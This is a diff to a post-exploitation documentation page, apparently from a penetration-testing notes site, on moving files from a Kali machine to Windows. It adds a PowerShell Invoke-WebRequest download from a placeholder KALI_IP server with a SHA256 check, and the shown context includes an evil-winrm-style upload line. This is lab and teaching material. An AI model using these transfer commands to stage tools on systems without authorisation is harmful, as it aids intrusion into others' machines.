@@ -7,7 +7,38 @@ boost: 10
 hideFooterPagination: true
 ---
 
+import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+
 {/* Generated from Commands/linux-to-windows.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+
+## Current operation: Download a served file from Kali to Windows
+
+**Run in:** Windows PowerShell. **Requires:** Kali is serving the intended directory with python3 -m http.server 8000; Windows can reach that address and write the destination.
+
+```powershell
+Invoke-WebRequest -UseBasicParsing 'http://KALI_IP:8000/file.bin' -OutFile 'C:\Users\Public\file.bin'
+Get-FileHash 'C:\Users\Public\file.bin' -Algorithm SHA256
+```
+
+**Read the result:** Confirm the downloaded object is the intended file rather than an HTML error/login page, then compare its hash.
+
+**If The result is empty or contains an HTML error page:** PowerShell and curl.exe are different clients; quoting, TLS trust, proxy configuration and the current working directory can change the result.
+
+**Next check:** Check the requested URL and server log, then compare the hash to the original before using the file.
+
+**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
+
+### Reviewed operation documentation
+
+- [Primary reference 1](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest)
+
+## Preserved earlier notes
+
+<PreservedNotes>
+
+Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
 
 ## Kali → Windows file transfer: choose the operation and read the result
 
@@ -88,3 +119,5 @@ upload ./file.exe C:\Users\Public\file.exe
 - [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
+
+</PreservedNotes>
